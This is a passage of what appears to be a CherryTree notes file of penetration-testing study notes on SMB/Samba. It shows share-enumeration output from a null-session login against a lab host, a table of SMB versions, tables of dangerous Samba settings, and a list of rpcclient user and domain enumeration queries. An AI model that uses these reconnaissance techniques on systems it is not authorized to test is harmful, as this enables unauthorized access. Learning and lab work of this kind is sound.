          <rich_text family="monospace" background="#000000000000" foreground="#ffaf00">10.129</rich_text>
          <rich_text family="monospace" background="#000000000000">.14.128 --shares -u </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">''</rich_text>
          <rich_text family="monospace" background="#000000000000"> -p </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#c5f467">''</rich_text>
          <rich_text family="monospace" background="#000000000000">

				SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
				SMB         10.129.14.128   445    DEVSMB           [+] \: 
				SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
				SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
				SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
				</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">SMB         10.129.14.128   445    DEVSMB           print</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">                          Printer Drivers
				SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
				SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
				SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
				</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">SMB         10.129.14.128   445    DEVSMB           IPC</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#ff8484" weight="heavy">$</rich_text>
          <rich_text family="monospace" background="#000000000000">                            IPC Service </rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">(</rich_text>
          <rich_text family="monospace" background="#000000000000">DEVSM</rich_text>
          <rich_text family="monospace" background="#000000000000" foreground="#a4b1cd">)</rich_text>
          <table char_offset="250" justification="left" col_min="300" col_max="300" col_widths="0,0,0">
            <row>
              <cell>CIFS</cell>
              <cell>Windows NT 4.0</cell>
              <cell>Communication via NetBIOS interface</cell>
            </row>
            <row>
              <cell>SMB 1.0</cell>
              <cell>Windows 2000</cell>
              <cell>Direct connection via TCP</cell>
            </row>
            <row>
              <cell>SMB 2.0</cell>
              <cell>Windows Vista, Windows Server 2008</cell>
              <cell>Performance upgrades, improved message signing, caching feature</cell>
            </row>
            <row>
              <cell>SMB 2.1</cell>
              <cell>Windows 7, Windows Server 2008 R2</cell>
              <cell>Locking mechanisms</cell>
            </row>
            <row>
              <cell>SMB 3.0</cell>
              <cell>Windows 8, Windows Server 2012</cell>
              <cell>Multichannel connections, end-to-end encryption, remote storage access</cell>
            </row>
            <row>
              <cell>SMB 3.0.2</cell>
              <cell>Windows 8.1, Windows Server 2012 R2</cell>
              <cell></cell>
            </row>
            <row>
              <cell>SMB 3.1.1</cell>
              <cell>Windows 10, Windows Server 2016</cell>
              <cell>Integrity checking, AES-128 encryption</cell>
            </row>
            <row>
              <cell>SMB Version</cell>
              <cell>Supported</cell>
              <cell>Features</cell>
            </row>
          </table>
          <table char_offset="1256" justification="left" col_min="300" col_max="300" col_widths="0,0">
            <row>
              <cell>[sharename]</cell>
              <cell>The name of the network share.</cell>
            </row>
            <row>
              <cell>workgroup = WORKGROUP/DOMAIN</cell>
              <cell>Workgroup that will appear when clients query.</cell>
            </row>
            <row>
              <cell>path = /path/here/</cell>
              <cell>The directory to which user is to be given access.</cell>
            </row>
            <row>
              <cell>server string = STRING</cell>
              <cell>The string that will show up when a connection is initiated.</cell>
            </row>
            <row>
              <cell>unix password sync = yes</cell>
              <cell>Synchronize the UNIX password with the SMB password?</cell>
            </row>
            <row>
              <cell>usershare allow guests = yes</cell>
              <cell>Allow non-authenticated users to access defined shared?</cell>
            </row>
            <row>
              <cell>map to guest = bad user</cell>
              <cell>What to do when a user login request doesn't match a valid UNIX user?</cell>
            </row>
            <row>
              <cell>browseable = yes</cell>
              <cell>Should this share be shown in the list of available shares?</cell>
            </row>
            <row>
              <cell>guest ok = yes</cell>
              <cell>Allow connecting to the service without using a password?</cell>
            </row>
            <row>
              <cell>read only = yes</cell>
              <cell>Allow users to read files only?</cell>
            </row>
            <row>
              <cell>create mask = 0700</cell>
              <cell>What permissions need to be set for newly created files?</cell>
            </row>
            <row>
              <cell>Setting</cell>
              <cell>Description</cell>
            </row>
          </table>
          <table char_offset="1282" justification="left" col_min="300" col_max="300" col_widths="0,0">
            <row>
              <cell>browseable = yes</cell>
              <cell>Allow listing available shares in the current share?</cell>
            </row>
            <row>
              <cell>read only = no</cell>
              <cell>Forbid the creation and modification of files?</cell>
            </row>
            <row>
              <cell>writable = yes</cell>
              <cell>Allow users to create and modify files?</cell>
            </row>
            <row>
              <cell>guest ok = yes</cell>
              <cell>Allow connecting to the service without using a password?</cell>
            </row>
            <row>
              <cell>enable privileges = yes</cell>
              <cell>Honor privileges assigned to specific SID?</cell>
            </row>
            <row>
              <cell>create mask = 0777</cell>
              <cell>What permissions must be assigned to the newly created files?</cell>
            </row>
            <row>
              <cell>directory mask = 0777</cell>
              <cell>What permissions must be assigned to the newly created directories?</cell>
            </row>
            <row>
              <cell>logon script = script.sh</cell>
              <cell>What script needs to be executed on the user's login?</cell>
            </row>
            <row>
              <cell>magic script = script.sh</cell>
              <cell>Which script should be executed when the script gets closed?</cell>
            </row>
            <row>
              <cell>magic output = script.out</cell>
              <cell>Where the output of the magic script needs to be stored?</cell>
            </row>
            <row>
              <cell>Setting</cell>
              <cell>Description</cell>
            </row>
          </table>
          <table char_offset="6571" justification="left" col_min="300" col_max="300" col_widths="0,0">
            <row>
              <cell>srvinfo</cell>
              <cell>Server information.</cell>
            </row>
            <row>
              <cell>enumdomains</cell>
              <cell>Enumerate all domains that are deployed in the network.</cell>
            </row>
            <row>
              <cell>querydominfo</cell>
              <cell>Provides domain, server, and user information of deployed domains.</cell>
            </row>
            <row>
              <cell>netshareenumall</cell>
              <cell>Enumerates all available shares.</cell>
            </row>
            <row>
              <cell>netsharegetinfo &lt;share&gt;</cell>
              <cell>Provides information about a specific share.</cell>
            </row>
            <row>
              <cell>enumdomusers</cell>
              <cell>Enumerates all domain users.</cell>
            </row>
            <row>
              <cell>queryuser &lt;RID&gt;</cell>
              <cell>Provides information about a specific user.</cell>
            </row>
            <row>
              <cell>Query</cell>
              <cell>Description</cell>
            </row>
          </table>
        </node>
      </node>
    </node>
  </node>
</cherrytree>
